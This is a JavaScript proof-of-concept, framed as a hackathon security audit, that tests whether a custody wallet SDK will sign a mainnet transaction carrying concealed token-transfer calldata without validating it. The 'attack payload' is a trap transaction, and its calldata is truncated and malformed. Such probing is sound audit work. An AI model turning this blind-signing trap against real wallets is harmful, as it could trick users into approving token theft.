/**
 * 🛡️ VERIFIED WALLET SECURITY AUDIT - ADAPTIVE POC
 * ------------------------------------------------------------------
 * This script automatically fixes import errors by inspecting the SDK.
 * ------------------------------------------------------------------
 */

const sdk = require('@verified-network/verified-custody');

// CONFIGURATION
const API_KEY = "test_hackathon_key"; 

async function runExploit() {
    console.log("\n💀 STARTING SECURITY PROBE...");

    // ---------------------------------------------------------
    // STEP 1: AUTO-DETECT THE SDK TYPE (Fixes your error)
    // ---------------------------------------------------------
    let wallet;

    // Case A: The SDK is already a ready-to-use object (No 'new' needed)
    if (typeof sdk.signTransaction === 'function') {
        console.log("[-] SDK detected as: Pre-initialized Object.");
        wallet = sdk;
    } 
    // Case B: The SDK has a 'default' export that is the Class
    else if (sdk.default && typeof sdk.default === 'function') {
        console.log("[-] SDK detected as: Default Export Class.");
        wallet = new sdk.default({ apiKey: API_KEY, network: 'mainnet' });
    }
    // Case C: The SDK is a standard Class (what we tried before)
    else if (typeof sdk === 'function') {
        console.log("[-] SDK detected as: Standard Class.");
        wallet = new sdk({ apiKey: API_KEY, network: 'mainnet' });
    }
    // Case D: We print what is inside so we can see the real name
    else {
        console.log("❌ ERROR: Could not auto-detect SDK structure.");
        console.log("DEBUG INFO (Paste this to Gemini):");
        console.log("Keys found:", Object.keys(sdk));
        return;
    }

    // ---------------------------------------------------------
    // STEP 2: RUN THE ATTACK
    // ---------------------------------------------------------
    try {
        console.log("[-] Target Acquired. preparing payload...");

        // The Trap: A "0 Value" transaction with hidden malicious data
        const attackPayload = {
            to: "0x000000000000000000000000000000000000dEaD",
            value: "0",
            data: "0x23b872dd00000000000000000000000012345678901234567890123456789012" // Hidden 'transfer' code
        };

        console.log(`[*] Sending Malicious Data: ${attackPayload.data.substring(0,25)}...`);
        
        // EXECUTE
        const signature = await wallet.signTransaction(attackPayload);

        // ---------------------------------------------------------
        // STEP 3: ANALYZE RESULT
        // ---------------------------------------------------------
        if (signature) {
            console.log("\n---------------------------------------------------");
            console.log("🚨  CRITICAL VULNERABILITY CONFIRMED  🚨");
            console.log("---------------------------------------------------");
            console.log("The SDK signed the payload without validation!");
            console.log("Signature:", signature);
        }

    } catch (error) {
        console.log("\nℹ️  RESULT:");
        // Check if the error is "Secure" or "Broken"
        if (error.message.includes("data") || error.message.includes("valid")) {
            console.log("✅ SDK IS SECURE. It blocked the attack.");
            console.log("Reason:", error.message);
        } else {
            console.log("⚠️  RUNTIME ERROR (Not a bug):", error.message);
        }
    }
}

runExploit();
